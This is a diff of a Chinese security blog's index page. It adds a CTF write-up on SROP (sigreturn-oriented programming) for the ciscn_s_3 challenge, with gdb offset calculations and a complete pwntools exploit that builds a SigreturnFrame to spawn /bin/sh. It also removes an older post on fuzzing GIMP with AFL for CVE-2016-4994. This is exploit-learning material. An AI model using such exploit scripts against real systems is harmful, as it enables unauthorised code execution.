@@ -60,10 +60,10 @@
 			</ul>
 		</nav>
                                 <nav>
-                                               总文章数 39
+                                               总文章数 40
                                 </nav>
                                 <nav>
-	总字数 <span class="post-count">66k</span>
+	总字数 <span class="post-count">66.9k</span>
                                 </nav>
 		<nav class="header-smart-menu">
     		
@@ -157,6 +157,110 @@
           </div>
           <div id="js-content" class="content-ll">
             
+  
+    <article id="post-SROP" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        <div align="center" class="post-count">
+    字数：411字 | 预计阅读时长：2分钟
+</div>
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/09/18/SROP/">SROP</a>
+    </h1>
+  
+
+        
+        <a href="/2023/09/18/SROP/" class="archive-article-date">
+  	<time datetime="2023-09-18T07:32:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-09-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>SROP</p>
+<p>x86参数都是保存在栈上面的， 而 x64 中的前六个参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 中，如果还有更多的参数的话才会保存在栈上。</p>
+<p>32 位的 sigreturn 的系统调用号为 77，64 位的系统调用号为 15</p>
+<p>改变rax的值可以通过pop rax ret或者read函数（read返回时会将rax赋成读取的字节数）。</p>
+<p><img src="/2023/09/18/SROP/image-20230919133510975.png"></p>
+<p>Set *addr &#x3D; value  给地址赋值  Set $rsp &#x3D; value  给寄存器赋值</p>
+<p>例题：ciscn_s_3</p>
+<p>先获取&#x2F;bin&#x2F;sh\x00的位置。</p>
+<p>先输入aaaaaaaa</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search aaaaaaaa</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/18/SROP/image-20230918205250352.png"></p>
+<p>获得其地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/8gx 0x7fffffffde10</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/18/SROP/image-20230918205322271.png"></p>
+<p>可以看到后续泄露了一个地址 0x00007fffffffdf38</p>
+<p>计算其和aaaaaaaa地址的偏移得</p>
+<p><img src="/2023/09/18/SROP/image-20230918205433726.png"></p>
+<p>即0x128</p>
+<p>或者直接调试</p>
+<p><img src="/2023/09/18/SROP/image-20230918205824784.png"></p>
+<p>binsh地址：0x7fffd6be7ca0</p>
+<p><img src="/2023/09/18/SROP/image-20230918205901928.png"></p>
+<p>泄漏的地址：0x7fffd6be7dc8</p>
+<p>同样 0x7fffd6be7dc8-0x7fffd6be7ca0&#x3D; 0x128</p>
+<p>找到mov rax，0xf</p>
+<p><img src="/2023/09/18/SROP/image-20230919134737096.png"></p>
+<p>syscall &#x3D; 0x400501</p>
+<p>通过SigreturnFrame()构造</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># execve(&#x27;/bin/sh&#x27;, 0, 0)</span></span><br><span class="line"><span class="comment"># rax 0x59</span></span><br><span class="line"><span class="comment"># rdi &#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="comment"># rsi NULL</span></span><br><span class="line"><span class="comment"># rdx NULL</span></span><br><span class="line">frame1.rax = constants.SYS_execve</span><br><span class="line">frame1.rdi = binsh_addr</span><br><span class="line">frame1.rsi = <span class="number">0</span></span><br><span class="line">frame1.rdx = <span class="number">0</span></span><br><span class="line">frame1.rip = syscall  <span class="comment"># 触发execve</span></span><br></pre></td></tr></table></figure>
+
+<p>相当于执行execve(‘&#x2F;bin&#x2F;sh’, 0, 0)</p>
+<p>payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch =<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal= [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,29614)</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vuln = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(vuln))</span><br><span class="line">syscall = <span class="number">0x0400501</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">payload = (<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">binsh_addr = addr-<span class="number">0x128</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sigreturn = <span class="number">0x04004DA</span></span><br><span class="line"></span><br><span class="line">frame1 = SigreturnFrame()</span><br><span class="line">frame1.rax = constants.SYS_execve</span><br><span class="line">frame1.rdi = binsh_addr</span><br><span class="line">frame1.rsi = <span class="number">0</span></span><br><span class="line">frame1.rdx = <span class="number">0</span></span><br><span class="line">frame1.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = (<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>) + p64(sigreturn) +p64(syscall) + <span class="built_in">bytes</span>(frame1) + p64(vuln)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>附</p>
+<p><img src="/2023/09/18/SROP/image-20230919142004043.png"></p>
+<p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/09/18/SROP/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
   
     <article id="post-buuctf-pwn刷题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
@@ -1125,121 +1229,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2023/07/20/Exercise-7-VLC-Media-Player/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Exercise-6-GIMP" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        <div align="center" class="post-count">
-    字数：1.2k字 | 预计阅读时长：5分钟
-</div>
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/07/18/Exercise-6-GIMP/">Exercise-6-GIMP</a>
-    </h1>
-  
-
-        
-        <a href="/2023/07/18/Exercise-6-GIMP/" class="archive-article-date">
-  	<time datetime="2023-07-18T06:33:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-07-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>For this exercise, we will fuzz <strong>GIMP</strong> image editor. The goal is to find a crash&#x2F;PoC for <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2016-4994/"><strong>CVE-2016-4994</strong></a> in GIMP 2.8.16.</p>
-<p>AFL（American Fuzzy Lop）是一种用于模糊测试的工具，而 AFL 的持久模式（persistent mode）是 AFL 中的一种运行模式。在持久模式下，AFL 会将目标程序保持在内存中，并重新利用先前的状态和信息来进行后续的模糊测试。</p>
-<p>在传统的 AFL 模糊测试中，每次执行目标程序时，AFL 都会生成一个新的输入，并将其传递给目标程序进行测试。然而，当目标程序具有大量初始化工作（如建立数据结构、加载文件等）或者需要长时间运行时，这种方式可能效率较低。</p>
-<p>持久模式解决了这个问题。在持久模式下，AFL 会首先执行目标程序一次，并保持其在内存中运行状态。之后，AFL 将生成的输入直接传递给目标程序的运行实例，而不需要重新初始化或加载。这样可以节省大量的时间和资源，加速模糊测试过程。</p>
-<p>基本结构的目标如下： </p>
-<h2 id="实验流程"><a href="#实验流程" class="headerlink" title="实验流程"></a>实验流程</h2><p>创建目录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span></span><br><span class="line"><span class="built_in">mkdir</span> fuzzing_gimp &amp;&amp; <span class="built_in">cd</span> fuzzing_gimp</span><br></pre></td></tr></table></figure>
-
-<p>本次的目标程序是一个带有GUI的可交互的程序，在构建编译上会比之前的软件稍微有一点复杂。</p>
-<p>安装依赖</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential libatk1.0-dev libfontconfig1-dev libcairo2-dev libgudev-1.0-0 libdbus-1-dev libdbus-glib-1-dev libexif-dev libxfixes-dev libgtk2.0-dev python2.7-dev libpango1.0-dev libglib2.0-dev zlib1g-dev intltool libbabl-dev</span><br></pre></td></tr></table></figure>
-
-<p>首先要安装gimp会使用到的 GEGL 0.2(Generic Graphics Library)，尝试使用源码编译：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.gimp.org/pub/gegl/0.2/gegl-0.2.0.tar.bz2</span><br><span class="line">tar xvf gegl-0.2.0.tar.bz2 &amp;&amp; cd gegl-0.2.0</span><br><span class="line">sed -i &#x27;s/CODEC_CAP_TRUNCATED/AV_CODEC_CAP_TRUNCATED/g&#x27; ./operations/external/ff-load.c</span><br><span class="line">sed -i &#x27;s/CODEC_FLAG_TRUNCATED/AV_CODEC_FLAG_TRUNCATED/g&#x27; ./operations/external/ff-load.c</span><br><span class="line">./configure --enable-debug --disable-glibtest  --without-vala --without-cairo --without-pango --without-pangocairo --without-gdk-pixbuf --without-lensfun --without-libjpeg --without-libpng --without-librsvg --without-openexr --without-sdl --without-libopenraw --without-jasper --without-graphviz --without-lua --without-libavformat --without-libv4l --without-libspiro --without-exiv2 --without-umfpack</span><br><span class="line">make -j$(nproc) </span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
-
-<p>使用源码编译会有一点问题，缺少一些库，所以直接使用sudo apt install libgegl-0.4-0来安装这个0.4版本的库。</p>
-<p>安装GIMP,在安装之前要根据提示修改一些源文件以进行AFL的持久化模式</p>
-<p>在 AFL 的持久化模式中，AFL 会保持执行目标程序，并持续不断地向其输入变异生成的测试用例，以持续进行模糊测试。这与传统的模糊测试方式不同，传统方式需要每次运行目标程序时都重新加载和初始化。</p>
-<p><img src="/2023/07/18/Exercise-6-GIMP/image-20230719000841432.png"></p>
-<p>根据提示对源码做相应修改</p>
-<p><img src="/2023/07/18/Exercise-6-GIMP/image-20230719001006928.png"></p>
-<p>修改完成后编译GIMP</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirror.klaus-uwe.me/gimp/pub/gimp/v2.8/gimp-2.8.16.tar.bz2</span><br><span class="line">tar xvf gimp-2.8.16.tar.bz2 &amp;&amp; cd gimp-2.8.16/</span><br><span class="line">CC=afl-clang-lto CXX=afl-clang-lto++ PKG_CONFIG_PATH=$PKG_CONFIG_PATH:$HOME/fuzzing_gimp/gegl-0.2.0/ CFLAGS=&quot;-fsanitize=address&quot; CXXFLAGS=&quot;-fsanitize=address&quot; LDFLAGS=&quot;-fsanitize=address&quot; ./configure --disable-gtktest --disable-glibtest --disable-alsatest --disable-nls --without-libtiff --without-libjpeg --without-bzip2 --without-gs --without-libpng --without-libmng --without-libexif --without-aa --without-libxpm --without-webkit --without-librsvg --without-print --without-poppler --without-cairo-pdf --without-gvfs --without-libcurl --without-wmf --without-libjasper --without-alsa --without-gudev --disable-python --enable-gimp-console --without-mac-twain --without-script-fu --without-gudev --without-dbus --disable-mp --without-linux-input --without-xvfb-run --with-gif-compression=none --without-xmc --with-shm=none --enable-debug  --prefix=&quot;$HOME/fuzzing_gimp/install&quot;</span><br><span class="line">make -j$(nproc)</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-
-<p>下载输入用例</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir afl_in &amp;&amp; cd afl_in</span><br><span class="line">wget https://github.com/antonio-morales/Fuzzing101/blob/main/Exercise%206/SampleInput.xcf</span><br></pre></td></tr></table></figure>
-
-<p>进行fuzz</p>
-<p>在此之前需要删一些不必要的插件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm ./install/lib/gimp/2.0/plug-ins/*</span><br><span class="line">ASAN_OPTIONS=detect_leaks=0,abort_on_error=1,symbolize=0 afl-fuzz -i &#x27;./afl_in&#x27; -o &#x27;./afl_out&#x27; -D -t 1000 -- ./install/bin/gimp-console-2.8 --verbose -d -f @@</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/07/18/Exercise-6-GIMP/image-20230719002138657.png"></p>
-<p>使用测试用例会显示超时，随便使用GIMP创建几个用例并设置时间上限-t 1000</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gimp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/07/18/Exercise-6-GIMP/image-20230731233039424.png"></p>
-<p><img src="/2023/07/18/Exercise-6-GIMP/image-20230719112808692.png"></p>
-<p>跑的很慢又没能出结果，观察到测试用例是图片比较大，于是只保留一个最小的进行测试</p>
-<p><img src="/2023/07/18/Exercise-6-GIMP/image-20230719121335709.png"></p>
-<p>并使用并发进行测试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ASAN_OPTIONS=detect_leaks=0,abort_on_error=1,symbolize=0 afl-fuzz -m none -i &#x27;./afl_in&#x27; -o &#x27;./out&#x27; -D -M master -t 1000 -- ./install/bin/gimp-console-2.8 --verbose -d -f @@</span><br><span class="line">ASAN_OPTIONS=detect_leaks=0,abort_on_error=1,symbolize=0 afl-fuzz -i &#x27;./afl_in&#x27; -o &#x27;./out&#x27; -D -S slave1 -t 1000 -- ./install/bin/gimp-console-2.8 --verbose -d -f @@</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/07/18/Exercise-6-GIMP/image-20230719152656822.png"></p>
-<p>目前还没有跑出结果，后续还会做一些调整尝试。</p>
-<p>重新做了一些调整，速度有所提升，但是还是没出结果。</p>
-<p><img src="/2023/07/18/Exercise-6-GIMP/image-20230720212010590.png"></p>
-<h2 id="总结与思考："><a href="#总结与思考：" class="headerlink" title="总结与思考："></a>总结与思考：</h2><p>本次实验主要学习了AFL的持久化模式，但是具体要怎么对文件修改还需进一步的学习。</p>
-<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://www.elecfans.com/d/1900647.html">https://www.elecfans.com/d/1900647.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lentikr/p/fuzzing101-z1mspwk.html#exercise6">https://www.cnblogs.com/lentikr/p/fuzzing101-z1mspwk.html#exercise6</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/HotSec/Fuzzing101/blob/main/Exercise%206/persistent.patch">https://github.com/HotSec/Fuzzing101/blob/main/Exercise%206/persistent.patch</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/07/18/Exercise-6-GIMP/">展开全文 >></a>
         </p>
       
 
